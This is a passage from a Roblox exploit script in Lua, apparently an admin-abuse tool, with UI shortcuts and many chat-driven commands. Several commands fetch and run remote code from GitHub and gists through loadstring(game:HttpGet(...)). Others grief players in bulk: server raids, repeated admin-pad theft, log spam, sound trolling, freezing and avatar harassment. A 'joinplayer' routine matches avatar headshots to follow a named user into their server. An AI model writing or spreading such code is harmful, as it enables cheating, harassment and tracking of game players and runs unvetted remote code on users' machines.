    local Library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
    
    local UI = Library:CreateWindow({
    Name = ScriptName, -- string.reverse(" "..'s\'ii')..string.reverse('u'..'t'.."S").."p"..'i'.."d A".."d"..string.reverse("nim")
    Theme = {
    Info = "n"..string.reverse"4".."tW"..'as'.."Ter"..tostring(tostring(string.reverse("nim"))).."ated#".."0"..tostring(math.random(505,505)).."\nDo not leak",
    Credit = false,
    Background = ""
    }
    })
    
    local Shortcuts = UI:CreateTab({
    Name = "Shortcuts"
    })
    
    local Toggles = Shortcuts:CreateSection({
    Name = "Toggles",
    Side = "Left"
    })
    
    Toggles:AddToggle({
    Name = "Anti Abuse",
    Callback = function(Value)
        if Value then
            runCommand(prefix.."antiabuse",{})
        else
            runCommand(prefix.."unantiabuse",{})
        end
    end
    })
    
    local Buttons = Shortcuts:CreateSection({
    Name = "Buttons",
    Side = "Left"
    })
    
    Buttons:AddButton({
    Name = "Fix Color",
    Callback = function()
    runCommand(prefix.."fixcolor",{})
    end
    })
    
    Buttons:AddButton({
    Name = "Give Random Gear",
    Callback = function()
    runCommand(prefix.."giverandomgears",{"1"})
    end
    })
    
    Buttons:AddButton({
    Name = "Rejoin",
    Callback = function()
    runCommand(prefix.."rejoin",{})
    end
    })
    
    Buttons:AddButton({
    Name = "Serverhop",
    Callback = function()
    runCommand(prefix.."serverhop",{})
    end
    })
    
    local Others = Shortcuts:CreateSection({
    Name = "Others",
    Side = "Left"
    })
    
    Others:AddTextbox({
        Name = "Music Lock",
        Value = 0,
        Callback = function(Value)
            Value = tonumber(Value)
            if Value == 0 then
                runCommand(prefix.."unmusiclock",{})
            else
                runCommand(prefix.."musiclock",{tostring(Value)})
            end
        end
    })
end)

addCommand("unkick",{},function()
    game.Players.LocalPlayer:Kick()
    game:GetService("GuiService"):ClearError()
    wait(1)
    local oldchr = game.Players.LocalPlayer.Character
    game.Players.LocalPlayer.Character.Archivable = true
    local cl = game.Players.LocalPlayer.Character:Clone()
    cl.Parent = game.Players.LocalPlayer.Character.Parent
    game.Players.LocalPlayer.Character = cl
    cl.Animate.Disabled = true
    cl.Animate.Disabled = false
    cl.Humanoid.DisplayName = ' '
    workspace.CurrentCamera.CameraSubject = cl.Humanoid
    oldchr:Destroy()
end)

addCommand("flashback",{},function()
    local s,f=pcall(function()
    game.Players:Chat("clr")
    game.Players:Chat("fix")
    wait(0.5)
    game.Players.LocalPlayer:Kick()
game:GetService("GuiService"):ClearError()
wait(1)
local oldchr = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Archivable = true
local cl = game.Players.LocalPlayer.Character:Clone()
cl.Parent = game.Players.LocalPlayer.Character.Parent
game.Players.LocalPlayer.Character = cl
cl.Animate.Disabled = true
cl.Animate.Disabled = false
cl.Humanoid.DisplayName = ' '
workspace.CurrentCamera.CameraSubject = cl.Humanoid
oldchr:Destroy()
for i,v in pairs(game.Players:GetPlayers()) do
    if v ~= game.Players.LocalPlayer then
        if v.Character then v.Character:Destroy() end
        v:Destroy() 
   end
end
local plr = game.Players.LocalPlayer
local chr = plr.Character
local cam = workspace.CurrentCamera
function getSoundId(githubLink,fileName)
    if not isfolder("LocalMusic") then makefolder("LocalMusic") end
    if not isfile("LocalMusic/"..tostring(fileName)..".mp3") then
        writefile("LocalMusic/"..tostring(fileName)..".mp3",HttpRequest({Url=githubLink, Method='GET'}).Body)
    end
    return getcustomasset("LocalMusic/"..tostring(fileName)..".mp3")
end
local Decals = {"4637746375","6576347905","6979660610","78447822","7506172164","710679541","6526139723","2782324454","9280156413","6673968185","1437859391","11819926495","8069372755","8821060194","6667438696","7451945741","275625339","6979666270","227600968","112902315","11820215885","12891462220","11705026198","7715663746","11820057661","11819921165","8821061671","9958218456","5045344938","5436305015","9828069207","1050963173","11950243047","62923965","26578092","10622919574","10623114008","8652370597","90567189","814707877","139437522","8821440921","9407842249","76908662","6979668008","127035411","9407831723","7715625420","126607040","1117897387","9627062113","6193821107","8833336491","6217147104","10622890506","5279365022","11160841806","9951340450","90742857","10186330449","11951646028","78930760","711250116","93390411","7451485806","4442686497","11112641193","8653620118","7933794221","2409898220","5328727837","1133551146","9446428596","3063526287","5168236799","3027413675","205375663","8071500208","5130124013","30726676","7451990646","120563099","10767242113","11151804229","475921335","7209933282","88658595","1032973774","9242918232","82838470","10839342505","10005446702","3296252270","3274375334","5879662438","2782426915","12748865890","924553118","10262947428","11285917237","32578004","12547653948","6510882688","894509910","8092894207","5974623667","25415923","141195004","10590231496","24150152","157995783","9882201716","11163672979","12018015043","178331926","8202921878","12682732708","10879175658","119019743","442876020","3523974778","11104232963","121661942","7762449183","1972219027","8743276425","10685184013","6009007680","11402172695","12487013349","10991955724","12654203777","279568210","9605261863","13001519646","4618126429","1927066326","9597859611","176206792"}
cam.CameraType = "Scriptable"
chr.Humanoid.WalkSpeed = 0
chr.Humanoid.JumpPower = 0
chr.HumanoidRootPart.CFrame = CFrame.new(-0.755462825, 3.69999933, -47.6910248)
local LocalMusic = Instance.new("Sound",workspace)
LocalMusic.Name = "LocalMusic__"
LocalMusic.Volume = 10
LocalMusic.Looped = true
LocalMusic.SoundId = getSoundId("https://raw.githubusercontent.com/iiDk-the-actual/Music/main/jealous.mp3","jealous")
LocalMusic:Play()
cam.CFrame = chr["Right Arm"].CFrame * CFrame.new(0.3,-0.9,-1.4)*CFrame.Angles(0,math.rad(180),0)
local CorrectionEffect = Instance.new("ColorCorrectionEffect",game.Lighting)
wait(4.6)
cam.CFrame = chr["Head"].CFrame * CFrame.new(0,0,-2.5)*CFrame.Angles(0,math.rad(180),0)
spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
        cam.CFrame = cam.CFrame:Lerp(chr["Head"].CFrame * CFrame.new(0,0,-1.5)*CFrame.Angles(0,math.rad(180),0),0.001)
    end)
end)
wait(0.5)
workspace.Terrain["_Game"].Workspace.Baseplate.Transparency = 1
CorrectionEffect.Saturation = -1
local LocalPart = Instance.new("Part",game.Players.LocalPlayer.Character)
LocalPart.Anchored = true
LocalPart.Size = Vector3.new(25.5,13,1)
LocalPart.Transparency = 0
LocalPart.Color = Color3.new(1,1,1)
LocalPart.CFrame = workspace.CurrentCamera.CFrame*CFrame.new(0,0,-10)*CFrame.Angles(0,math.rad(180),0)
local Decal = Instance.new("Decal",LocalPart)
while true do
Decal.Texture = "rbxthumb://type=Asset&id="..Decals[math.random(1,#Decals)].."&w=150&h=150"
wait(0.1)
end
end) if not s then print(f)end
end)

addCommand("dex",{},function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

addCommand("explorer",{},function()
	runCommand(prefix.."dex",{})
end)

addCommand("banhammer",{},function(args)
    loadstring(game:HttpGet("https://gist.githubusercontent.com/iiDk-the-actual/c22667e1601001c347aa8da41622aaed/raw/0714ef377dc50262e8fc6645089c03effe77ad56/KAH-BanHammer"))()
end)

addCommand("admingiver",{},function(args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/deneme/main/deneme"))()
end)

addCommand("bcamera",{"players"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local vchar = v.Character
		game.Players:Chat("name "..v.Name.." "..ScriptName)
		repeat wait() until vchar.Parent==nil or vchar:FindFirstChildOfClass("Model")
		game.Players:Chat("unname "..v.Name)
	end
end)

addCommand("freezecamera",{"players"},function(args)
    local Player = GetPlayers(args[1])
for i,v in pairs(Player) do
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)
local thedollarsecondary = Instance.new("Part",game.Players.LocalPlayer.Character)
		thedollarsecondary.Anchored = true
		thedollarsecondary.Size = Vector3.new(10,1,10)
		thedollarsecondary.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
    game.Players:Chat("gear me 94794847")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    local VampireVanquisher = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    VampireVanquisher.Parent = game.Players.LocalPlayer.Character
    repeat wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    
    repeat wait()
        print(game.Players.LocalPlayer:DistanceFromCharacter(v.Character.Head.Position))
    firetouchinterest(VampireVanquisher.Handle,v.Character.Head,0)firetouchinterest(VampireVanquisher.Handle,v.Character.Head,1)
    until game.Players.LocalPlayer:DistanceFromCharacter(v.Character.Head.Position) < 10
    game.Players:Chat("respawn me")
end
end)

addCommand("soundspam",{"frequency","delay"},function(args)
    for i=1,args[1] do 
        game.Players:Chat("hat me 305888394")
        if tonumber(args[2])>0 then
        wait(tonumber(args[2]))
        end
    end
end)

addCommand("audiolog",{},function()
	if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
		print("The song being played is "..workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").SoundId)
	end
	
	GUI:SendMessage(ScriptName,"Check the developer console for the logged audios.")
end)

addCommand("spamlogs",{},function()
    for i=1,50 do
        game.Players:Chat([[ff ███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
███████████████████████████████
]])
wait()
    end
end)

addCommand("mute",{},function()
    Loops.mute = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("Sound") then if v.Playing then v:Stop() end end
        end
    until not Loops.mute
end)

addCommand("unmute",{},function()
    Loops.mute = false
end)

addCommand("timepositionmusic",{"timeposition"},function(args)
    game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition = args[1]
end)

addCommand("timepositionall",{"timeposition"},function(args)
    for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then v.TimePosition = args[1] end
    end
end)

addCommand("iscrashed",{},function()
	return checkIsCrashed()
end)

addCommand("if",{"input","then/else","output"},function(args)
	local input = false
	if args[1]:lower() == "iscrashed" then input=checkIsCrashed() end
	if args[2] == "else" then input = not input end
	if input then
		local fixer = {args[4]}
    		for i=5, #args do
    		    table.insert(fixer,args[i])
    		end
		runCommand(prefix..args[3],fixer)
	end
end)

addCommand("loadregen",{"streamingdistance"},function(args)
    local AlreadyChecked = {}
local Range = 0
local streamingdistance = tonumber(args[1])
local RegenLoaded = false
while not RegenLoaded do
    for Y=0,Range do
        for X=Range*-1,Range do
            for Z=Range*-1,Range do
                if RegenLoaded then break end
                if not table.find(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)) then
                    print("X: "..tostring(X).." / Y: "..tostring(Y).." / Z: "..tostring(Z))
                    table.insert(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance))
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)
                    game:GetService("RunService").RenderStepped:Wait()
                    if game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen") then
                        RegenLoaded = true
			print("Found regen pad!")
                    end
                end
            end
        end
    end
    if not RegenLoaded then Range = Range + 1 end
end
end)

addCommand("serverdata",{},function()

Loops.serverdata = true

local UI = Instance.new("ScreenGui",game.CoreGui)
UI.ResetOnSpawn = true
UI.Name = "iiStupidAdmin serverdata"

local FPS = Instance.new("TextLabel",UI)
FPS.AnchorPoint = Vector2.new(0,1)
FPS.Position = UDim2.new(0,0,1,0)
FPS.BackgroundTransparency = 1
FPS.TextColor3 = Color3.new(0,1,0)
FPS.Text = "FPS: yes"
FPS.TextSize = 20
FPS.Size = UDim2.new(0.1,0,0,30)
FPS.TextXAlignment = Enum.TextXAlignment.Left
FPS.TextYAlignment = Enum.TextYAlignment.Bottom

local Ping = Instance.new("TextLabel",UI)
Ping.AnchorPoint = Vector2.new(0,1)
Ping.Position = UDim2.new(0,0,1,-30)
Ping.BackgroundTransparency = 1
Ping.TextColor3 = Color3.new(0,1,0)
Ping.Text = "Ping: yes"
Ping.TextSize = 20
Ping.Size = UDim2.new(0.1,0,0,30)
Ping.TextXAlignment = Enum.TextXAlignment.Left
Ping.TextYAlignment = Enum.TextYAlignment.Bottom

local function Lerp(a, b, t)
    return a + (b - a) * t
end

local CurrentFPS = 1/game:GetService("RunService").RenderStepped:Wait()
repeat game:GetService("RunService").RenderStepped:Wait()
CurrentFPS = Lerp(CurrentFPS,1/game:GetService("RunService").RenderStepped:Wait(),0.1)
FPS.Text = "FPS: "..tostring(math.floor(CurrentFPS))
FPS.TextColor3 = Color3.fromRGB((127.5-math.clamp(CurrentFPS,0,127.5))*2,math.clamp(CurrentFPS,0,127.5)*2,0)

local CurrentPing = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1])
Ping.Text = "Ping: "..math.floor(CurrentPing).."ms"
Ping.TextColor3 = Color3.fromRGB(math.clamp((math.clamp(CurrentPing,0,510))/2,0,255),math.clamp((510-math.clamp(CurrentPing,0,510))/2,0,255),0)
until not Loops.serverdata

UI:Destroy()

end)

addCommand("unserverdata",{},function()
	Loops.serverdata = false
end)

addCommand("loadbaseplate",{"streamingdistance"},function(args)
    local AlreadyChecked = {}
local Range = 0
local streamingdistance = tonumber(args[1])
local RegenLoaded = false
while not RegenLoaded do
    for Y=0,Range do
        for X=Range*-1,Range do
            for Z=Range*-1,Range do
                if RegenLoaded then break end
                if not table.find(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)) then
                    print("X: "..tostring(X).." / Y: "..tostring(Y).." / Z: "..tostring(Z))
                    table.insert(AlreadyChecked,CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance))
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(X*streamingdistance,Y*streamingdistance,Z*streamingdistance)
                    game:GetService("RunService").RenderStepped:Wait()
                    if workspace.Terrain["_Game"].Workspace:FindFirstChild("Baseplate") then
                        RegenLoaded = true
			print("Found baseplate!")
                    end
                end
            end
        end
    end
    if not RegenLoaded then Range = Range + 1 end
end
end)

addCommand("soundtroll",{},function()
    Loops.soundtroll = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then 
            if v.Playing == false then v:Play() end v.TimePosition = math.random(0,v.TimeLength*100)/100 end
    end
    until not Loops.soundtroll
end)

addCommand("spawnkill",{},function()
    local obbydestroyed = false
    spawn(function()
        if game.Chat:FindFirstChild("Obby") then obbydestroyed = true runCommand(prefix.."localaddobby",{}) end
    end)
    wait()
    moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9,CFrame.new(-41.0650024, 1.30000007, -28.601058959961, 0, 0, -1, 0, 1, 0, 1, 0, 0))
if obbydestroyed then spawn(function()
    runCommand(prefix.."localremoveobby",{})
end) end
end)

addCommand("trapspawn",{},function()
    moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,CFrame.new(-10.7921638, 17.3182983, -16.0743637, -0.999961913, -0.0085983118, 0.00151610479, -1.01120179e-08, 0.173648253, 0.98480773, -0.00873095356, 0.984770179, -0.173641637))
end)

addCommand("unsoundtroll",{},function()
    Loops.soundtroll = false
end)

addCommand("stopsoundtroll",{},function()
    runCommand(prefix.."unsoundtroll",{})
end)

addCommand("raid",{},function()
    Loops.raid = true
    repeat wait()
        pcall(function()
            if PersonsAdmin then
        game.Players:Chat("m/raided by "..ScriptName)
        else
           game.Players:Chat("m raided by "..ScriptName) 
        end
        local Player = GetPlayers("others")
        for i,v in pairs(Player) do
            for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
            local pos = chr.HumanoidRootPart.CFrame
            game.Players:Chat("size "..v.Name.." nan")
            wait()
            game.Players:Chat("freeze "..v.Name)
            wait()
            for i=1,5 do
                game.Players:Chat("gear me 25741198")
                wait()
            end
            wait()
            for zxz,xzx in pairs(chr:GetDescendants())do if v:IsA("BasePart") then v.Velocity = Vector3.new(0,0,0)end end
            chr.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,7.5)
            wait(0.25)
            chr.HumanoidRootPart.Anchored=true
            wait(0.3)
            for i,v in pairs(plr.Backpack:GetChildren()) do
                v.Parent = chr
                wait()
                v:Activate()
                wait()
                v.Parent=workspace
                wait()
            end
            chr.HumanoidRootPart.Anchored=false
            chr.HumanoidRootPart.CFrame = pos
        end
        end)
    until not Loops.raid
end)


addCommand("stopraid",{},function()
    Loops.raid = false
end)

addCommand("regen",{},function()
    fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
end)

addCommand("fixregen",{},function()
    moveObject(game:GetService("Workspace").Terrain["_Game"].Admin.Regen,CFrame.new(-7.16500044, 5.42999268, 91.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0))
end)

addCommand("fixadmin",{},function()
    local adminPadCFrames = {CFrame.new(-40.7649879, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-36.7649803, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-32.7649765, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-20.7649632, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-44.7649994, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-12.7649641, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-28.7649689, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-16.7649612, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-24.764967, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)}
    for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
        moveObject(v.Head,adminPadCFrames[i]*CFrame.new(0,4,0))
        wait(0.25)
    end
end)

addCommand("fixpads",{},function()
    runCommand(prefix.."fixadmin",{})
end)

addCommand("fixbaseplate",{},function()
    moveObject(workspace.Terrain["_Game"].Workspace.Baseplate,CFrame.new(-501, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
end)

addCommand("autoadmin",{},function()
    Loops.autoadmin = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            if v.Name ~= plr.Name.."'s admin" then
                firetouchinterest(chr.Head,v.Head,0)firetouchinterest(chr.Head,v.Head,1)
            end
        end
    until not Loops.autoadmin
end)

addCommand("unautoadmin",{},function()
    Loops.autoadmin = false
end)

addCommand("loopgrab",{},function()
    runCommand(prefix.."autoadmin",{})
end)

addCommand("unloopgrab",{},function()
    runCommand(prefix.."unautoadmin",{})
end)

addCommand("lg",{},function()
    runCommand(prefix.."autoadmin",{})
end)

addCommand("unlg",{},function()
    runCommand(prefix.."unautoadmin",{})
end)
        
addCommand("perm",{},function()
    Loops.perm = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        padNames = {}
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            table.insert(padNames,v.Name)
        end
        if not table.find(padNames,game.Players.LocalPlayer.Name.."'s admin") then
            if table.find(padNames,"Touch to get admin") then
                for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
                    if v.Name == "Touch to get admin" then
                        firetouchinterest(chr.Head,v.Head,0)firetouchinterest(chr.Head,v.Head,1)
                        break
                    end
                end
            else
                
            end
        end
    until not Loops.perm
end)

addCommand("unperm",{},function()
    Loops.perm = false
end)

addCommand("noperm",{},function()
    runCommand(prefix.."unperm",{})
end)

addCommand("noadmin",{},function()
    Loops.noadmin = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            if v.Name ~= "Touch to get admin" then
                game.Players:Chat("respawn "..v.Name:split("'s admin")[1])
                fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
            end
        end
    until not Loops.noadmin
end)

addCommand("antiadmin",{},function()
    runCommand(prefix.."noadmin",{})
end)

addCommand("unnoadmin",{},function()
    Loops.noadmin = false
end)

addCommand("unantiadmin",{},function()
    runCommand(prefix.."unnoadmin",{})
end)

addCommand("afkindicator",{},function()
	local isFocused = true
	local cacheAntiName = Loops.antiname
	Connections.afkindicatora = game:GetService("UserInputService").WindowFocused:Connect(function()
		if cacheAntiName then
			spawn(function()
			runCommand(prefix.."antiname",{})
			end)
		end
		isFocused = true
	end)
	Connections.afkindicatorb = game:GetService("UserInputService").WindowFocusReleased:Connect(function()
		if Loops.antiname then
			cacheAntiName = true
			spawn(function()
			runCommand(prefix.."unantiname",{})
			end)
		end
		isFocused = false
	end)
	Loops.afkindicator = true
	repeat wait(0.5)
		if not isFocused then
if not game.Players.LocalPlayer.Character:FindFirstChild(game.Players.LocalPlayer.DisplayName.."\n[AFK]") then			
game.Players:Chat("name me "..game.Players.LocalPlayer.DisplayName.."\n[AFK]")
			end
		end
	until not Loops.afkindicator
end)

addCommand("unafkindicator",{},function()
	Loops.afkindicator = false
	Connections.afkindicatora:Disconnect()
	Connections.afkindicatorb:Disconnect()
end)

addCommand("adminprotect",{},function()
    Loops.adminprotect = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        pcall(function()
        local PadNames = {}
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
            if table.find(PadNames,v.Name) then
                local vname = v.Name
                v.Name = "stupid holder name so my script doesn't run the same thing 500 times"
                fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
                game.Players:Chat("respawn "..game.Players[vname:split("'s")[1]].Name)
                spawn(function()
                    wait(0.3)
                    GUI:SendMessage(ScriptName, "Please only grab a singular admin pad, "..game.Players[vname:split("'s")[1]].DisplayName..".")
                end)
            else
                if v.Name ~= "Touch to get admin" then
                    table.insert(PadNames,v.Name)
                end
            end
        end
        end)
    until not Loops.adminprotect
end)

addCommand("unadminprotect",{},function()
    Loops.adminprotect = false
end)

addCommand("joinplayer",{"username"},function(args)
local silent = false
if args[2] then silent = true end
-- entirely bender's script not mine thx evant or event or whatever im sryy :cryingrn:
print("joining player mhm")
function JoinPlayer(plrID)
        -- Variables
        local userID = plrID
        local gameID = tostring(game.PlaceId)
        local httpService = game:GetService("HttpService")
        local servers, cursor = {}
    
        -- Error handling
        local success, response = pcall(function()
            -- API call
            local serverData = HttpRequest({
                Url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100%s", gameID, cursor and "&cursor=" .. cursor or "")
            })
            cursor = serverData.nextPageCursor
            serverData = httpService:JSONDecode(serverData.Body)
    
            -- More Variables
            local playerHeadshot = HttpRequest({
                Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=".. userID .. "&size=150x150&format=Png&isCircular=false"
            })
            local playerImageURL = httpService:JSONDecode(playerHeadshot.Body).data[1].imageUrl
    
            -- Starting the player search
            for _, server in ipairs(serverData.data) do
                -- Looping through every player in the game to store their headshot
                local playerIcons = {}
                for i = 1, #server.playerTokens do
                    table.insert(playerIcons, {
                        token = server.playerTokens[i],
                        type = "AvatarHeadshot",
                        size = "150x150",
                        requestId = server.id
                    })
                end
    
                -- Pulling any server data from the headshot
                local postRequest = HttpRequest({
                    Url = "https://thumbnails.roblox.com/v1/batch",
                    Method = "POST",
                    Body = httpService:JSONEncode(playerIcons),
                    Headers = {
                        ["Content-Type"] = "application/json"
                    }
                })
                local recvServerData = httpService:JSONDecode(postRequest.Body).data
    
                -- Making sure there's no blank data
                if recvServerData then
			print("serverdata")
                    -- Check if the headshot is a match
                    for _, v in ipairs(recvServerData) do
			print(tostring(v.imageUrl))
                        if v.imageUrl == playerImageURL then
                            _G.foundPlayer = true
				print("join is success")
                            game:GetService("TeleportService"):TeleportToPlaceInstance(gameID, v.requestId)
                            return
                        end
                    end
                end
            end
        end)
    
        if not success then
            warn("An error occurred:", response)
        end
    end
print("function initialized")
local id=0
local Request = args[1]
local infoRequest = HttpRequest({Url="https://api.joinbender.com/roblox/LookupAPI/userinfo.php?username="..Request})
print("sent request")
for i, json in pairs(infoRequest) do
if (type(json) == "string") then
id=json:gsub('.*"id":(.-),.*', '%1')
print("found id")
print(id)
end
end
if id=='{"data":[]}' then
if not silent then
GUI:SendMessage(ScriptName, "Couldn't fetch a valid server from your request.")
end
print("no id :(")
return
end
if not silent then
GUI:SendMessage(ScriptName, "Attempting to join...")
end
print("id :)")
JoinPlayer(id)
print(" joining!!")
end)


addCommand("freeze",{"player"},function(args)
	local Player = GetPlayers(args[1])
	for i,v in pairs(Player) do
game.Players:Chat("unff "..v.Name)
	local originalCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    game.Players:Chat("gear me 130113146")
	game.Players:Chat("speed "..v.Name.." 0")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    local gun = game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    gun.Parent = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Head.CFrame * CFrame.new(-1,-1,4)
wait(.3333)
	repeat wait() 
	 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Head.CFrame * CFrame.new(-1,-1,4)
	spawn(function()
	    local A_1 = "Click"
		local A_2 = true
		local A_3 = v.Character.Head.Position
		gun.ServerControl:InvokeServer(A_1, A_2, A_3)
	end)
	until v.Character.Head:FindFirstChildOfClass("SelectionBox")
	print("selectionbox :D")
	game.Players:Chat("reset me")
	wait(0.25)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=originalCFrame
end
end)

addCommand("attach",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("speed "..v.Name.." 0")
	game.Players:Chat("freeze "..v.Name)
	game.Players:Chat("unfreeze "..v.Name)
	repeat wait() until v.Character:FindFirstChild("ice")
	v.Character.ice:Destroy()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*CFrame.new(1.5,0,0)
	wait(0.25)
	game.Players:Chat("unpunish me")
    end
end)

addCommand("stopscript",{},function()
    spawn(function()
        if game.Chat:FindFirstChild("Obby") then runCommand(prefix.."localaddobby",{}) end
    end)
	pcall(function()
		if workspace:FindFirstChild("_FakeObby") then runCommand(prefix.."unantinokill",{}) end
	end)
    for i,v in pairs(Connections) do v:Disconnect() end
    for i,v in pairs(Toolbans) do v:Disconnect() end
    for i,v in pairs(Loops) do Loops[i]=false end
    CommandBar:Destroy()
    GUI:SendMessage(ScriptName, "Successfully stopped.")
end)

addCommand("naked",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        if v and v.Character and v.Character.Head then
            game.Players:Chat("paint "..v.Name.." "..v.Character.Head.BrickColor.Name)
        end
    end
end)

addCommand("nude",{"player"},function(args)
    runCommand(prefix.."naked",args)
end)

addCommand("femify",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("char "..v.Name.." 31342830")
        repeat wait() until v and v.Character and v.Character:FindFirstChild("Ultra-Fabulous Hair")
        wait(0.3)
        game.Players:Chat("removehats "..v.Name)
        wait()
        game.Players:Chat("paint "..v.Name.." Institutional white")
        wait()
        game.Players:Chat("hat "..v.Name.." 7141674388")
        wait()
        game.Players:Chat("hat "..v.Name.." 7033871971")
        wait()
        game.Players:Chat("shirt "..v.Name.." 5933990311")
        wait()
        game.Players:Chat("pants "..v.Name.." 7219538593")
        wait()
    end
end)

addCommand("furrify",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("unpackage " ..v.Name)
        wait(0.5)
        game.Players:Chat("paint "..v.Name.." Institutional white")
        wait()
        game.Players:Chat("hat "..v.Name.." 10563319994")
        wait()
        game.Players:Chat("hat "..v.Name.." 12578728695")
        wait()
        game.Players:Chat("shirt "..v.Name.." 10571467676")
        wait()
        game.Players:Chat("pants "..v.Name.." 10571468508")
        wait()
    end
end)

addCommand("noobify",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        game.Players:Chat("char "..v.Name.." 18")
        wait()
    end
end)

addCommand("rejoin",{},function()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.jobId)
end)

addCommand("serverhop",{},function()
	function Serverhop()
		local Servers = {}
		for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId then
				table.insert(Servers,v.id)
			end
		end
		
		if #Servers~=0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
		else
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
	end
	
	Serverhop()
	game:GetService("TeleportService").TeleportInitFailed:Connect(Serverhop)
end)

addCommand("serverbrowser",{},function()
local Servers = {}
local function loadServers()
